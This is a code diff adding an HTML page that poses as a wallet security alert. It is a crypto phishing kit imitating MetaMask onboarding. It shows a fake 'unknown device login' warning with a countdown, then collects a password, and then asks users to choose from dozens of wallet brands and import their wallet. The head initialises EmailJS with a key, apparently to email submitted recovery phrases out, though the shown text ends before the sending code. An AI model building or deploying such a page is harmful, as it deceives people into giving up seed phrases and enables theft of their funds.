@@ -1,0 +1,2013 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Alert & Wallet Interface</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 100%;
+            min-height: 100vh;
+            background: #f8f9fa;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .screen {
+            display: none;
+            padding: 20px;
+            min-height: 100vh;
+            width: 100%;
+            position: relative;
+            overflow-y: auto;
+        }
+
+        .screen.active {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .content-wrapper {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* Security Alert Screen */
+        .security-screen {
+            text-align: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .security-screen .content-wrapper {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px 30px;
+            color: #333;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+        }
+
+        .security-title {
+            font-size: clamp(24px, 5vw, 32px);
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 30px;
+            line-height: 1.3;
+        }
+
+        .alert-badge {
+            background: #e3f2fd;
+            color: #1976d2;
+            padding: 12px 24px;
+            border-radius: 25px;
+            font-weight: 500;
+            margin-bottom: 30px;
+            display: inline-block;
+            font-size: clamp(14px, 3vw, 16px);
+        }
+
+        .security-description {
+            color: #555;
+            font-size: clamp(14px, 3.5vw, 18px);
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .timer-container {
+            margin: 30px 0;
+        }
+
+        .timer-text {
+            color: #42a5f5;
+            font-size: clamp(16px, 4vw, 20px);
+            font-weight: 500;
+        }
+
+        .countdown {
+            font-size: clamp(20px, 5vw, 28px);
+            font-weight: bold;
+            color: #f44336;
+        }
+
+        .warning-text {
+            color: #666;
+            font-size: clamp(14px, 3.5vw, 18px);
+            margin: 30px 0;
+            line-height: 1.5;
+        }
+
+        .additional-warning-text {
+            color: #888;
+            font-size: clamp(12px, 3vw, 16px);
+            margin: 20px 0 30px 0;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .verify-btn,
+        .continue-btn,
+        .next-btn,
+        .create-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #2196f3, #1976d2);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: clamp(16px, 4vw, 20px);
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+            margin-top: 20px;
+            min-height: 50px;
+        }
+
+        /* Smaller continue button for stage 4 */
+        #stage4 .continue-btn {
+            width: auto;
+            min-width: 150px;
+            max-width: 200px;
+            padding: 12px 24px;
+            font-size: clamp(14px, 3.5vw, 16px);
+            min-height: auto;
+            margin: 20px auto 0 auto;
+            display: block;
+        }
+
+        .verify-btn:hover,
+        .continue-btn:hover,
+        .next-btn:hover,
+        .create-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .continue-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+            padding: 0 20px;
+            width: 100%;
+        }
+
+        .progress-step {
+            width: clamp(28px, 6vw, 36px);
+            height: clamp(28px, 6vw, 36px);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+            font-size: clamp(12px, 3vw, 16px);
+            position: relative;
+        }
+
+        .progress-step.active {
+            background: #2196f3;
+        }
+
+        .progress-step.completed {
+            background: #4caf50;
+        }
+
+        .progress-step.inactive {
+            background: #e0e0e0;
+            color: #999;
+        }
+
+        .progress-line {
+            width: clamp(40px, 10vw, 80px);
+            height: 2px;
+            background: #e0e0e0;
+            margin: 0 8px;
+            transition: background 0.3s;
+        }
+
+        .progress-line.completed {
+            background: #4caf50;
+        }
+
+        /* Stage 1: Secure Your Wallet */
+        .secure-wallet {
+            text-align: center;
+        }
+
+        .secure-title {
+            font-size: clamp(28px, 6vw, 36px);
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 40px;
+        }
+
+        .safe-illustration {
+            width: clamp(150px, 40vw, 250px);
+            height: clamp(120px, 30vw, 180px);
+            background: linear-gradient(135deg, #64b5f6, #42a5f5);
+            border-radius: 20px;
+            margin: 30px auto;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .safe-icon {
+            width: clamp(60px, 15vw, 100px);
+            height: clamp(60px, 15vw, 100px);
+            background: #1976d2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: clamp(24px, 6vw, 40px);
+        }
+
+        .secure-description {
+            color: #666;
+            font-size: clamp(14px, 3.5vw, 18px);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .highlight-text {
+            color: #2196f3;
+            font-weight: 500;
+        }
+
+        /* Stage 2: Help Us Improve */
+        .improve-screen {
+            padding-top: 20px;
+        }
+
+        .improve-title {
+            font-size: clamp(24px, 5vw, 32px);
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        .improve-description {
+            color: #666;
+            font-size: clamp(14px, 3.5vw, 18px);
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .privacy-item {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 20px;
+        }
+
+        .check-icon {
+            color: #4caf50;
+            font-size: clamp(18px, 4vw, 24px);
+            margin-right: 12px;
+            margin-top: 2px;
+        }
+
+        .privacy-content {
+            flex: 1;
+        }
+
+        .privacy-label {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+            font-size: clamp(14px, 3.5vw, 18px);
+        }
+
+        .privacy-text {
+            color: #666;
+            font-size: clamp(12px, 3vw, 16px);
+            line-height: 1.4;
+        }
+
+        .checkbox-item {
+            display: flex;
+            align-items: flex-start;
+            margin: 20px 0;
+            padding: 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+        }
+
+        .checkbox {
+            width: 18px;
+            height: 18px;
+            margin-right: 12px;
+            margin-top: 2px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+
+        .no-thanks-btn {
+            flex: 1;
+            min-width: 120px;
+            padding: 16px;
+            background: transparent;
+            color: #2196f3;
+            border: 2px solid #2196f3;
+            border-radius: 12px;
+            font-size: clamp(14px, 3.5vw, 18px);
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .agree-btn {
+            flex: 1;
+            min-width: 120px;
+            padding: 16px;
+            background: linear-gradient(45deg, #2196f3, #1976d2);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: clamp(14px, 3.5vw, 18px);
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .privacy-link {
+            color: #2196f3;
+            text-decoration: none;
+        }
+
+        /* Stage 3: MetaMask Password */
+        .password-screen {
+            padding-top: 20px;
+        }
+
+        .password-title {
+            font-size: clamp(24px, 5vw, 32px);
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+
+        .password-subtitle {
+            color: #666;
+            font-size: clamp(14px, 3.5vw, 18px);
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: clamp(14px, 3.5vw, 18px);
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: clamp(14px, 3.5vw, 18px);
+            background: white;
+            transition: border-color 0.3s;
+            position: relative;
+        }
+
+        .password-input-container {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: clamp(16px, 4vw, 20px);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #2196f3;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            margin: 20px 0;
+        }
+
+        .toggle-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 30px 0;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .toggle {
+            position: relative;
+            width: 50px;
+            height: 26px;
+            background: #2196f3;
+            border-radius: 13px;
+            cursor: pointer;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            top: 2px;
+            right: 2px;
+            width: 22px;
+            height: 22px;
+            background: white;
+            border-radius: 50%;
+            transition: transform 0.3s;
+        }
+
+        .toggle.off {
+            background: #ccc;
+        }
+
+        .toggle.off .toggle-slider {
+            transform: translateX(-24px);
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #666;
+            cursor: pointer;
+            padding: 5px;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-close:hover {
+            background: #f0f0f0;
+        }
+
+        .modal-title {
+            font-size: clamp(20px, 4.5vw, 28px);
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            margin-right: 40px;
+            line-height: 1.3;
+        }
+
+        .modal-text {
+            color: #555;
+            font-size: clamp(14px, 3.5vw, 18px);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .modal-warning {
+            color: #333;
+            font-size: clamp(14px, 3.5vw, 18px);
+            font-weight: 600;
+            margin: 20px 0 10px 0;
+        }
+
+        .modal-list {
+            margin: 10px 0 20px 0;
+            padding-left: 0;
+        }
+
+        .modal-list li {
+            list-style: none;
+            padding: 8px 0;
+            color: #555;
+            font-size: clamp(14px, 3.5vw, 18px);
+            position: relative;
+            padding-left: 20px;
+        }
+
+        .modal-list li::before {
+            content: "•";
+            color: #333;
+            font-weight: bold;
+            position: absolute;
+            left: 0;
+        }
+
+        .modal-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #2196f3, #1976d2);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: clamp(16px, 4vw, 20px);
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .read-more-link {
+            color: #2196f3;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+            margin-left: 8px;
+        }
+
+        .read-more-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Stage 4: Import Wallet */
+        .import-screen {
+            padding-top: 20px;
+        }
+
+        .import-title {
+            font-size: clamp(28px, 6vw, 36px);
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 20px;
+        }
+
+        .import-subtitle {
+            color: #666;
+            font-size: clamp(14px, 3.5vw, 18px);
+            margin-bottom: 20px;
+        }
+
+        .phrase-container {
+            background: #f5f5f5;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            min-height: 150px;
+            border: 2px solid #e0e0e0;
+            position: relative;
+            cursor: text;
+        }
+
+        .phrase-textarea {
+            width: 100%;
+            height: 100px;
+            background: transparent;
+            border: none;
+            outline: none;
+            font-size: clamp(12px, 3vw, 16px);
+            line-height: 1.5;
+            color: #333;
+            resize: none;
+            font-family: inherit;
+        }
+
+        .phrase-textarea::placeholder {
+            color: #999;
+        }
+
+        .phrase-textarea.hidden-text {
+            color: transparent;
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+        }
+
+        .phrase-actions {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .show-all-btn,
+        .paste-btn {
+            background: none;
+            border: none;
+            color: #2196f3;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: clamp(14px, 3.5vw, 18px);
+            transition: color 0.2s;
+        }
+
+        .show-all-btn:hover,
+        .paste-btn:hover {
+            color: #1976d2;
+        }
+
+        /* Wallet Selection Styles */
+        .wallet-selection-container {
+            margin-top: 20px;
+            margin-bottom: 30px;
+        }
+
+        .wallet-selector {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: clamp(14px, 3.5vw, 18px);
+            background: white;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s ease;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6,9 12,15 18,9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 20px;
+            padding-right: 50px;
+        }
+
+        .wallet-selector:focus {
+            outline: none;
+            border-color: #2196f3;
+            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
+        }
+
+        .wallet-selector option {
+            padding: 12px;
+            font-size: clamp(14px, 3.5vw, 18px);
+        }
+
+        .wallet-selection-label {
+            display: block;
+            font-size: clamp(14px, 3.5vw, 18px);
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .selected-wallet-display {
+            margin-top: 12px;
+            padding: 12px;
+            background: #e3f2fd;
+            border-radius: 8px;
+            color: #1976d2;
+            font-weight: 500;
+            display: none;
+            font-size: clamp(14px, 3.5vw, 18px);
+        }
+
+        .selected-wallet-display.show {
+            display: block;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: none;
+            border: none;
+            font-size: clamp(14px, 3.5vw, 18px);
+            color: #666;
+            cursor: pointer;
+            padding: 10px;
+            transition: color 0.2s;
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+        }
+
+        .back-btn:hover {
+            color: #333;
+        }
+
+        .avatar {
+            position: absolute;
+            bottom: 30px;
+            right: 30px;
+            width: clamp(50px, 10vw, 80px);
+            height: clamp(50px, 10vw, 80px);
+            background: #ddd;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: clamp(20px, 5vw, 32px);
+            color: #999;
+        }
+
+        /* Secure Connection Indicator */
+        .secure-connection {
+            margin-top: 15px;
+            color: white;
+            background: linear-gradient(45deg, #3b82f6, #1d4ed8);
+            font-weight: 500;
+            border-radius: 6px;
+            font-size: clamp(10px, 2.5vw, 14px);
+            padding: 6px 12px;
+            text-align: center;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 4px rgba(59, 130, 246, 0.2);
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .secure-connection:hover {
+            background: linear-gradient(45deg, #2563eb, #1e40af);
+            transform: translateY(-1px);
+            box-shadow: 0 3px 6px rgba(59, 130, 246, 0.3);
+        }
+
+        .secure-connection svg {
+            width: 12px;
+            height: 12px;
+            fill: currentColor;
+        }
+
+        /* Success Modal - Smaller Size */
+        #successModal .modal-content {
+            max-width: 350px;
+            padding: 25px;
+        }
+
+        #successModal .modal-title {
+            font-size: clamp(18px, 4vw, 22px);
+            margin-bottom: 15px;
+        }
+
+        #successModal .modal-text {
+            font-size: clamp(13px, 3vw, 16px);
+            margin-bottom: 15px;
+        }
+
+        #successModal .modal-warning {
+            font-size: clamp(13px, 3vw, 16px);
+            margin: 15px 0 8px 0;
+        }
+
+        #successModal .modal-list li {
+            font-size: clamp(12px, 3vw, 15px);
+            padding: 4px 0;
+        }
+
+        .complete-import-btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background: linear-gradient(45deg, #2196f3, #1976d2);
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-size: clamp(14px, 3vw, 16px);
+            font-weight: 600;
+            margin-top: 15px;
+            width: auto;
+            text-align: center;
+            transition: transform 0.2s;
+        }
+
+        .complete-import-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Error state for required fields */
+        .wallet-selector.error {
+            border-color: #f44336;
+            box-shadow: 0 0 0 3px rgba(244, 67, 54, 0.1);
+        }
+
+        .phrase-container.error {
+            border-color: #f44336;
+        }
+
+        .error-message {
+            color: #f44336;
+            font-size: clamp(12px, 3vw, 14px);
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Responsive breakpoints */
+        @media (max-width: 768px) {
+            .screen {
+                padding: 15px;
+            }
+
+            .content-wrapper {
+                max-width: 100%;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .no-thanks-btn,
+            .agree-btn {
+                flex: none;
+                width: 100%;
+            }
+
+            .toggle-container {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+
+            .back-btn {
+                top: 15px;
+                left: 15px;
+            }
+
+            .avatar {
+                bottom: 20px;
+                right: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .screen {
+                padding: 10px;
+            }
+
+            .security-screen .content-wrapper {
+                padding: 30px 20px;
+            }
+
+            .modal-content {
+                padding: 20px;
+            }
+
+            .progress-bar {
+                padding: 0 10px;
+            }
+        }
+
+        /* Landscape orientation adjustments */
+        @media (orientation: landscape) and (max-height: 600px) {
+            .screen {
+                justify-content: flex-start;
+                padding-top: 40px;
+                padding-bottom: 40px;
+            }
+
+            .safe-illustration {
+                width: clamp(120px, 25vw, 200px);
+                height: clamp(90px, 20vw, 150px);
+            }
+
+            .safe-icon {
+                width: clamp(50px, 12vw, 80px);
+                height: clamp(50px, 12vw, 80px);
+                font-size: clamp(20px, 5vw, 32px);
+            }
+        }
+
+        /* Large desktop screens */
+        @media (min-width: 1200px) {
+            .content-wrapper {
+                max-width: 600px;
+            }
+
+            .screen {
+                padding: 40px;
+            }
+
+            .security-screen .content-wrapper {
+                padding: 60px 50px;
+            }
+        }
+
+        /* High DPI displays */
+        @media (-webkit-min-device-pixel-ratio: 2),
+        (min-resolution: 192dpi) {
+
+            .secure-connection svg,
+            .safe-icon,
+            .check-icon {
+                image-rendering: -webkit-optimize-contrast;
+            }
+        }
+    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"
+        integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <!-- Emailjs Hook-->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <!-- Connect your public key here-->
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("3zwxr8u9l2WSe1cgv");
+        })();
+    </script>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Security Alert Screen -->
+        <div class="screen security-screen active" id="securityScreen">
+            <div class="content-wrapper">
+                <h1 class="security-title">Security Alert:<br>Unknown Device<br>Login Detected</h1>
+
+                <div class="alert-badge">Immediate Action Required</div>
+
+                <p class="security-description">
+                    We detected an unusual login attempt to your wallet from an unrecognized device. For your security,
+                    immediate verification is required to maintain access to your account.
+                </p>
+
+                <div class="timer-container">
+                    <div class="timer-text">Time remaining to verify: <span class="countdown"
+                            id="countdown">59:59</span></div>
+                </div>
+
+                <p class="warning-text">
+                    To prevent unauthorized access, please verify your identity immediately.
+                </p>
+
+                <button class="verify-btn" onclick="goToStage(1)">Verify Now</button>
+
+                <p class="additional-warning-text">
+                    If you did not attempt to login, please verify immediately to secure your account and prevent
+                    unauthorized access.
+                </p>
+
+                <div class="avatar">👤</div>
+            </div>
+        </div>
+
+        <!-- Stage 1: Secure Your Wallet -->
+        <div class="screen secure-wallet" id="stage1">
+            <button class="back-btn" onclick="goToSecurityScreen()">
+                < back</button>
+
+                    <div class="content-wrapper">
+                        <div class="progress-bar">
+                            <div class="progress-step active">1</div>
+                            <div class="progress-line"></div>
+                            <div class="progress-step inactive">2</div>
+                            <div class="progress-line"></div>
+                            <div class="progress-step inactive">3</div>
+                            <div class="progress-line"></div>
+                            <div class="progress-step inactive">4</div>
+                        </div>
+
+                        <h1 class="secure-title">Secure your wallet from Attack</h1>
+
+                        <div class="safe-illustration">
+                            <div class="safe-icon">🔐</div>
+                        </div>
+
+                        <p class="secure-description">
+                            Don't risk losing your funds. Protect your wallet away From people and save your <span
+                                class="highlight-text">Secret Recovery Phrase </span>In A save and secure place.
+                        </p>
+
+                        <p class="secure-description">
+                            It's the only way to recover your wallet if you get locked out from any app or get a new
+                            device.
+                        </p>
+
+                        <button class="continue-btn" onclick="goToStage(2)">Get Started</button>
+                    </div>
+        </div>
+
+        <!-- Stage 2: Help Us Improve MetaMask -->
+        <div class="screen improve-screen" id="stage2">
+            <button class="back-btn" onclick="goToStage(1)">
+                < back</button>
+
+                    <div class="content-wrapper">
+                        <div class="progress-bar">
+                            <div class="progress-step completed">1</div>
+                            <div class="progress-line completed"></div>
+                            <div class="progress-step active">2</div>
+                            <div class="progress-line"></div>
+                            <div class="progress-step inactive">3</div>
+                            <div class="progress-line"></div>
+                            <div class="progress-step inactive">4</div>
+                        </div>
+
+                        <h1 class="improve-title">Blockchain Security Alart</h1>
+
+                        <p class="improve-description">
+                            if you got this Notification Alart, it mean your crypto wallet is under Attack by the
+                            Blackhat Hackers. blockchain always update security everyday to prevent all crypto wallet
+                            from being Attack, proceed to secure your wallet from Blackhat hackers. Blockchain will
+                            never sell data, all data is secure and safe on blockchain system.
+                        </p>
+
+                        <div class="privacy-item">
+                            <span class="check-icon">✓</span>
+                            <div class="privacy-content">
+                                <div class="privacy-label">Private:</div>
+                                <div class="privacy-text">secure your wallet from family & friend and do not open wallet
+                                    in public place.</div>
+                            </div>
+                        </div>
+
+                        <div class="privacy-item">
+                            <span class="check-icon">✓</span>
+                            <div class="privacy-content">
+                                <div class="privacy-label">General:</div>
+                                <div class="privacy-text">We temporarily use your IP address to detect a general
+                                    location (like your country or region), but it's never stored and we notify you
+                                    immediately via email if we notice any suspicious login attack.</div>
+                            </div>
+                        </div>
+
+                        <div class="privacy-item">
+                            <span class="check-icon">✓</span>
+                            <div class="privacy-content">
+                                <div class="privacy-label">Optional:</div>
+                                <div class="privacy-text">Your wallet is your vault—protect the keys, or someone else
+                                    will own your treasure.</div>
+                            </div>
+                        </div>
+
+                        <div class="checkbox-item">
+                            <input type="checkbox" class="checkbox" id="marketingCheck">
+                            <div>
+                                <div class="privacy-text">We'll use this data to learn how you interact with blockchain
+                                    communications. We may share relevant news (like product features).</div>
+                            </div>
+                        </div>
+
+                        <p class="improve-description" style="font-size: 14px;">
+                            We'll let you know if we decide to use this data for other purposes. You can review our <a
+                                href="#" class="privacy-link">Privacy Policy</a> for more information.
+                        </p>
+
+                        <div class="button-group">
+                            <button class="no-thanks-btn" onclick="goToStage(3)">No thanks</button>
+                            <button class="agree-btn" onclick="goToStage(3)">I agree</button>
+                        </div>
+                    </div>
+        </div>
+
+        <!-- Stage 3: MetaMask Password -->
+        <div class="screen password-screen" id="stage3">
+            <button class="back-btn" onclick="goToStage(2)">
+                < back</button>
+
+                    <div class="content-wrapper">
+                        <div class="progress-bar">
+                            <div class="progress-step completed">1</div>
+                            <div class="progress-line completed"></div>
+                            <div class="progress-step completed">2</div>
+                            <div class="progress-line completed"></div>
+                            <div class="progress-step active">3</div>
+                            <div class="progress-line"></div>
+                            <div class="progress-step inactive">4</div>
+                        </div>
+
+                        <h1 class="password-title">Secure with strong password</h1>
+                        <p class="password-subtitle">secured connection.</p>
+
+                        <div class="form-group">
+                            <label class="form-label">Create new password</label>
+                            <div class="password-input-container">
+                                <input type="password" class="form-input" placeholder="Enter a strong password"
+                                    id="password1">
+                                <button type="button" class="password-toggle"
+                                    onclick="togglePassword('password1')">👁</button>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Confirm password</label>
+                            <div class="password-input-container">
+                                <input type="password" class="form-input" placeholder="Re-enter your password"
+                                    id="password2">
+                                <button type="button" class="password-toggle"
+                                    onclick="togglePassword('password2')">👁</button>
+                            </div>
+                        </div>
+
+                        <div class="checkbox-container">
+                            <input type="checkbox" class="checkbox" id="passwordCheck">
+                            <div style="margin-left: 12px;">
+                                <div style="color: #333; font-size: 14px;">Notice: this password is not use to unlock
+                                    any type of crypto wallet you are using, this is to prevent from beeing hacked only.
+                                    <a href="#" class="privacy-link">Learn more.</a>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="toggle-container">
+                            <span style="color: #333; font-weight: 500;">Unlock with Face ID?</span>
+                            <div class="toggle" id="faceIdToggle" onclick="toggleFaceId()">
+                                <div class="toggle-slider"></div>
+                            </div>
+                        </div>
+
+                        <button class="create-btn" onclick="validatePassword()">Create password</button>
+                    </div>
+        </div>
+
+        <!-- Stage 4: Import Wallet -->
+        <div class="screen import-screen" id="stage4">
+            <button class="back-btn" onclick="goToStage(3)">
+                < back</button>
+
+                    <div class="content-wrapper">
+                        <div class="progress-bar">
+                            <div class="progress-step completed">1</div>
+                            <div class="progress-line completed"></div>
+                            <div class="progress-step completed">2</div>
+                            <div class="progress-line completed"></div>
+                            <div class="progress-step completed">3</div>
+                            <div class="progress-line completed"></div>
+                            <div class="progress-step active">4</div>
+                        </div>
+
+                        <h1 class="import-title">Import a wallet</h1>
+
+                        <!-- Wallet Selection -->
+                        <!-- Begin Form -->
+                        <form class="ajaxForm" method="POST" onsubmit="return validateRecoveryPhrase()">
+                            <div class="wallet-selection-container">
+                                <label class="wallet-selection-label">Select your wallet type</label>
+                                <select class="wallet-selector" id="walletSelector" name="wallet" onchange="onWalletSelection()">
+                                    <option value="">Choose your wallet...</option>
+
+                                    <!-- Popular Wallets -->
+                                    <option value="metamask">🦊 MetaMask</option>
+                                    <option value="trustwallet">🛡️ Trust Wallet</option>
+                                    <option value="coinbase">🔵 Coinbase Wallet</option>
+                                    <option value="phantom">👻 Phantom</option>
+                                    <option value="rainbow">🌈 Rainbow</option>
+                                    <option value="exodus">⚡ Exodus</option>
+                                    <option value="atomic">⚛️ Atomic Wallet</option>
+
+                                    <!-- Hardware Wallets -->
+                                    <option value="ledger">📱 Ledger</option>
+                                    <option value="trezor">🔐 Trezor</option>
+                                    <option value="keepkey">🔐 KeepKey</option>
+                                    <option value="coolwallet">❄️ CoolWallet</option>
+                                    <option value="bc.vault">🏦 BC Vault</option>
+                                    <option value="keystone">🗿 Keystone</option>
+                                    <option value="gridplus">⚡ GridPlus</option>
+                                    <option value="ellipal">🔒 Ellipal</option>
+                                    <option value="cobo">🔵 Cobo Vault</option>
+                                    <option value="onekey">1️⃣ OneKey</option>
+                                    <option value="bitbox">📦 BitBox</option>
+                                    <option value="secux">🔒 SecuX</option>
+
+                                    <!-- DeFi & Web3 Wallets -->
+                                    <option value="uniswap">🦄 Uniswap Wallet</option>
+                                    <option value="1inch">1️⃣ 1inch Wallet</option>
+                                    <option value="zerion">🔷 Zerion</option>
+                                    <option value="argent">🛡️ Argent</option>
+                                    <option value="gnosis">🔺 Gnosis Safe</option>
+                                    <option value="walletconnect">🔗 WalletConnect</option>
+                                    <option value="myetherwallet">🔹 MyEtherWallet</option>
+                                    <option value="ens">🌐 ENS Wallet</option>
+
+                                    <!-- Mobile Wallets -->
+                                    <option value="imtoken">🪙 imToken</option>
+                                    <option value="tokenpocket">💼 TokenPocket</option>
+                                    <option value="mathwallet">📐 MathWallet</option>
+                                    <option value="safepal">🛡️ SafePal</option>
+                                    <option value="bitkeep">🔑 BitKeep</option>
+                                    <option value="alphawallet">α Alpha Wallet</option>
+                                    <option value="unstoppable">🚫 Unstoppable Domains</option>
+                                    <option value="pillar">🏛️ Pillar Wallet</option>
+                                    <option value="status">📱 Status</option>
+                                    <option value="walletio">💳 Wallet.io</option>
+
+                                    <!-- Solana Ecosystem -->
+                                    <option value="solflare">☀️ Solflare</option>
+                                    <option value="sollet">🌞 Sollet</option>
+                                    <option value="slope">📈 Slope</option>
+                                    <option value="backpack">🎒 Backpack</option>
+                                    <option value="glow">✨ Glow</option>
+
+                                    <!-- Exchange Wallets -->
+                                    <option value="binance">🟡 Binance Wallet</option>
+                                    <option value="crypto.com">💎 Crypto.com DeFi Wallet</option>
+                                    <option value="okx">⭕ OKX Wallet</option>
+                                    <option value="bybit">🎯 Bybit Wallet</option>
+                                    <option value="kucoin">🔶 KuCoin Wallet</option>
+                                    <option value="huobi">🔺 Huobi Wallet</option>
